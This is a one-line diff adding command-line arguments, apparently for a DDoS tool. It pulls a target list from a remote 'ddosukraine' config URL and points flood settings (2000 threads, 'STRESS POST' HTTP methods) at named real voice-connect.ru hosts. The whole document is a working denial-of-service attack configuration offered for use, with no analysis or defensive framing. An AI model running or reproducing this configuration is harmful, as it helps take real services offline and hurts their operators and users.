@@ -1,0 +1,1 @@
+-c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt https://home.voice-connect.ru http://home.voice-connect.ru https://my.voice-connect.ru -t 2000 --rpc 2000 -p 900 --http-methods STRESS POST --table
